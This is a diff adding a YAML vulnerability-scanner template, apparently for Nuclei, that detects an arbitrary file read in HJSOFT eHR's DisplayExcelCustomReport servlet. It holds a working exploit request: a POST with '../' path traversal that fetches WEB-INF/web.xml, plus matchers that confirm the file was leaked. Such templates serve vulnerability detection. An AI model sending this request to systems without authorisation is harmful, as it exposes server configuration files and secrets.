@@ -1,0 +1,30 @@
+id: hjsoft-ehr-displayexcelcustomreport-anyfile-read
+info:
+  name: HJSOFT eHR DisplayExcelCustomReport Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Vulnerability in HJSOFT eHR's DisplayExcelCustomReport endpoint allows arbitrary file reading via crafted requests.
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/templates/attestation/../../servlet/DisplayExcelCustomReport"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "filename=../webapps/ROOT/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "<?xml"
+      - type: word
+        part: header
+        words:
+          - "application/msexcel;charset=GBK"
+          - "filename=web.xml"
